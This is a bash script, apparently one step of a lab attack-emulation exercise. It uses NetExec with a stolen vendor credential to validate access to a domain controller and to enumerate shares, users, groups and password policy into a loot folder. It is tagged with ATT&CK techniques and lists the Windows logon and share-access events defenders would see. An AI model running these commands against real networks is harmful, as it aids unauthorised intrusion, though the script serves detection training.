#!/usr/bin/env bash
# Step 1: Validate the stolen credential and map what it can reach.
source "$(dirname "$0")/00-config.sh"
assert_lab_target "$DC_IP"; assert_lab_target "$FS_IP"

banner "01 RECON - credential validation + discovery"
atk "T1078.002 Valid Accounts: Domain | T1018 Remote System Discovery"
atk "T1087.002 Account Discovery | T1135 Network Share Discovery | T1069.002 Group Discovery"

echo "[*] Confirming the credential works against the DC..."
nxc smb "$DC_IP" -u "$VENDOR_USER" -p "$VENDOR_PASS"

echo "[*] Enumerating shares on DC and file server (looking for over-exposed data)..."
nxc smb "$DC_IP" "$FS_IP" -u "$VENDOR_USER" -p "$VENDOR_PASS" --shares | tee "$LOOT/shares.txt"

echo "[*] Pulling domain users, groups, and password policy..."
nxc smb "$DC_IP" -u "$VENDOR_USER" -p "$VENDOR_PASS" --users    | tee "$LOOT/users.txt"
nxc smb "$DC_IP" -u "$VENDOR_USER" -p "$VENDOR_PASS" --groups   | tee "$LOOT/groups.txt"
nxc smb "$DC_IP" -u "$VENDOR_USER" -p "$VENDOR_PASS" --pass-pol | tee "$LOOT/pass-pol.txt"

expect "4624 logon type 3 from the attacker IP for v-coolair (many, fast)"
expect "5140/5145 network share access events on fs01"
echo "[+] Recon done. Note how little of this looks different from normal vendor activity."
